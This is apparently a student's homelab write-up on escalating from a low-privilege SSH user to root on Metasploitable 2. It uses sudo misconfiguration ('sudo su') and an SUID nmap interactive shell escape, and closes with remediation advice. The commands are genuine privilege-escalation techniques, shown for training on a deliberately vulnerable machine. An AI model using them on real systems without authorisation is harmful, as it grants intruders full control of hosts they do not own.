# Lab 4 — Linux Privilege Escalation

**Date:** June 2026  
**Target:** Metasploitable 2 (`192.168.1.101`)  
**Attacker:** Kali Linux (`192.168.1.100`)  
**Environment:** Proxmox homelab, isolated network (vmbr1)

---

## Objective

Starting from a low-privilege SSH session, escalate to root using two different techniques — sudo misconfiguration and SUID binary abuse.

---

## Methodology

### Step 1 — Initial Access via SSH

Connected to the target from Kali using SSH:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.1.101
```

> Note: The `-oHostKeyAlgorithms=+ssh-rsa` flag is required because Metasploitable uses legacy SSH key types disabled by default in modern Kali.

Logged in as `msfadmin` — a standard low-privilege user.

```bash
whoami
# msfadmin
```

---

### Method 1 — Sudo Misconfiguration

Checked sudo permissions for the current user:

```bash
sudo -l
```

**Result:** msfadmin can run ALL commands as root with no password restriction.

This is a critical misconfiguration. Exploited it to escalate:

```bash
sudo su
whoami
# root
```

**Root achieved.**

---

### Method 2 — SUID Binary Abuse (nmap)

Exited back to msfadmin and searched for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

**Notable result:** `/usr/bin/nmap`

nmap with the SUID bit set runs as root regardless of who executes it. Old versions of nmap include an interactive mode that allows shell command execution.

Exploited it:

```bash
nmap --interactive
!sh
whoami
# root
```

**Root achieved without sudo or password.**

---

## Vulnerabilities Identified

| Vulnerability | Description | Severity |
|---|---|---|
| Sudo misconfiguration | msfadmin granted ALL sudo permissions | Critical |
| SUID on nmap | nmap runs as root, interactive mode allows shell escape | High |

---

## Remediation

**Sudo misconfiguration:**
- Never grant `ALL` sudo permissions to standard users
- Restrict sudo to specific commands only
- Require password for all sudo usage
- Audit sudo permissions regularly with `sudo -l`

**SUID binary abuse:**
- Remove SUID bit from nmap: `chmod -s /usr/bin/nmap`
- Audit all SUID binaries regularly
- Only set SUID on binaries that absolutely require it

---

## Tools Used

- `ssh` — remote access
- `sudo -l` — enumerate sudo permissions
- `find` — SUID binary enumeration
- `nmap --interactive` — shell escape via SUID binary

---

## Key Takeaways

- Always enumerate sudo permissions immediately after gaining a shell
- SUID binaries are a common real-world privilege escalation vector
- GTFOBins (gtfobins.github.io) is the go-to reference for SUID binary exploits
- Metasploitable intentionally has these vulnerabilities for training purposes — real systems should never be configured this way